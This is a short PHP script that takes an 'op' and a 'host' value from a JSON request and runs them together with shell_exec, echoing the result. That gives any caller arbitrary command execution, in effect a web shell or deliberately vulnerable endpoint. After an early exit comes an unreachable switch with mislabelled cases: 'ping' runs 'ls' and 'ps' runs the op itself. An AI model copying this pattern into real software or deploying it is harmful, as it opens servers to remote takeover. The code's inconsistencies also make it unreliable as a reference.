<?php

$data = json_decode(file_get_contents('php://input'), true);
$host = $data['host'];
$op = $data['op'];




$output = shell_exec("$op $host");

echo "<pre>$output</pre>";

exit(0);

switch ($op) {
    case "ping":
        $output = shell_exec("ls $host");
        break;
    case "whois":
        $output = shell_exec("whois $host");
        break;
    case "host":
        $output = shell_exec("host $host");
        break;
    case "ps":
        $output = shell_exec("$op");
        break;
}




?>